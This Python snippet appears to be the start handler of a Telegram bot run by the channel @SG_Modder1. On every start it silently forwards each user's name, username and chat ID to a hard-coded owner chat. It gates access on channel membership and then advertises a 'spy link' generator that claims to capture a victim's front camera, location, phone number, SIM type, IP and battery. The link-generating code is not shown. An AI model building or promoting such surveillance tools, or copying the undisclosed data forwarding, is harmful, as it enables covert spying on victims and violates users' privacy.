user_id = message.from_user.id
channel_username = "@SG_Modder1"
chat_member = None
owner_chat_id = 1249726999  # Owner's chat ID

# Ensure that we correctly access username and full name, even if some fields are missing
full_name = message.from_user.full_name if message.from_user.full_name else "No name provided"
username = f"@{message.from_user.username}" if message.from_user.username else "No username"

# Prepare user information message
user_info = f"User information 😎\n" \
            f"Full Name: {full_name}\n" \
            f"Username: {username}\n" \
            f"User chat id: {user_id}\n"

try:
    # Check if the user is a member of the channel
    chat_member = bot.get_chat_member(chat_id=channel_username, user_id=user_id)
except Exception as e:
    pass

# Send the user information to the owner regardless of channel membership
bot.sendMessage(chat_id=owner_chat_id, text=user_info)

if chat_member and chat_member.status in ["creator", "administrator", "member"]:
    # User is a member, send the welcome message with a bit more detail and personalization
    welcome_message = (
        "🎉 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 @SG_Modder1! 🎉\n\n"
        "You can use this bot to generate a spy link! 🎉\n\n"
        "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗛𝗮𝗰𝗸 :\n"
        "🔹 Front Camera\n"
        "🔹 Location with map\n"
        "🔹 Phone number\n"
        "🔹 Sim Type\n"
        "🔹 IP, Battery, and many more\n\n"
        "𝗡𝗼𝘁𝗲: 𝗜𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗮𝗻𝗱 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗽𝘂𝗿𝗽𝗼𝘀𝗲𝘀 💡\n\n"
        "Now type and send /create to generate your link. 😊"
    )
    bot.sendMessage(chat_id=message.chat.id, text=welcome_message)
else:
    # User is not a member, send a more engaging "Join" message with a button and additional explanation
    not_member_message = (
        "❌ 𝗼𝗽𝘀! it looks like you’re not a member of our official channel yet.\n\n"
        "🎁 𝗪𝗵𝘆 𝘀𝗵𝗼𝘂𝗹𝗱 𝘆𝗼𝘂 𝗷𝗼𝗶𝗻? \n\n"
        "By joining @SG_Modder1, you’ll get:\n"
        "🔹 Stay updated with latest features\n"
        "🔹 Receive priority support\n"
        "🔹 Joining is easy, just tap the Join @SG_Modder1 button below to become part of the community!\n\n"
        "After Join Resend /start command"
    )
    
    # Inline keyboard with a "Join" button
    keyboard = [
        [{"text": "Join @SG_Modder1", "url": f"https://t.me/{channel_username[1:]}"}]
    ]
    
    # Send the message with the "Join" button and additional benefits of joining
    bot.sendMessage(
        chat_id=message.chat.id,
        text=not_member_message,
        reply_markup={"inline_keyboard": keyboard}
    )
